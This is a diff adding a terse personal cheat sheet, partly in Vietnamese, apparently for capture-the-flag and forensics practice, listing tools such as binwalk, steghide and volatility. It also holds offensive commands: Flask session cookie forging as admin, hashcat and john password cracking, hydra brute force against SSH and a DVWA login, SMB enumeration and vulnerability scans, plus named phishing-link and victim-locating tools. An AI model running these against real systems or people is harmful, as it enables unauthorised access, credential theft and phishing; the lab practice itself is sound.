@@ -1,0 +1,58 @@
+split, pdfinfo, pdfimages, pdfcrack, pdfdetach, Keepass, Magic Numbers, hexed.it, foremost, Repair image online tool, 
+photorec, TestDisk, pngcheck, pngcsum, Registry Dumper, Dnscat2, pefile, Wireshark, Network Miner, PCAPNG, tcpflow, 
+PcapXray, qpdf, Audacity, sonic visualiser, ffmpeg strings, file, grep, scalpel, bgrep, hexdump, xxd, base64, xplico 
+framework, zsteg, gimp, Memory dump - volatility, ethscan, and many more.
+exiftool
+
+hexedit // dump hex of a file
+
+binwalk --dd='.*' wallet.jpeg
+Ta được file _wallet.jpg.extracted . Sau đó check file ta thấy có 2 file 0 và 2E11E
+Ta sẽ đổi đuôi file 2E11E thành .pdf
+
+flask-unsign --decode --cookie <session_cookie>
+flask-unsign --unsign --cookie <session_cookie> --wordlist cookies.txt
+flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'kiss'
+
+steghide
+steghide embed -ef secret.txt -cf StegoCat.jpg -e none -Z
+steghide extract -sf stegoCat.jpg -xf extractSecret.txt
+
+wireshark
+Follow UDP Stream
+tshark -Y "mysql contains db_m3149.users" -r capture.pcap -Tjson --no-duplicate-keys > result.json
+
+file.wav
+Sound đang ở đạng Waveform ta chỉnh sang Spectrogram là ra flag
+
+--------------------------------decode
+rainbowcrack            #hash
+hashcat   #jwt,...
+hashcat -a 0 -m 13600 sheng.txt ./rockyou.txt
+join need_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
+------------------------------------
+
+domainfy -n eccountcil -t all  #retrieve all the domains along with their IP address
+
+domainfy -n eccountcil -t all  #retrieve all the domains along with their IP address
+jasminenguyen12387
+
+hydra 192.168.8.200 ssh -l admin -P file_src -s 22 -vV
+                                        (port) (only show usr pass)
+hydra -l admin -P /home/kali/Desktop/pass.txt -u -f 192.168.8.200 -s 80 http-post-form "/DVWA/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+
+-------------------check firewall
+wafw00f <url>
+---------------------smb
+#enumerating information from Windows and Samba systems
+enum4linux 192.168.134.40
+nmapAutomator.sh -H 192.168.66.42 -t vulns
+nmapAutomator.sh -H 192.168.66.42 -t full
+--------------------------
+markphish  ---create phising link
+fsociety   ---hacktoolkit
+seeker     -----find location
+./ngrok http 8080
+grabify(may not good as seeker)
+DFIRtriage -- extract info from victim's computer
+proxychain --hide IP
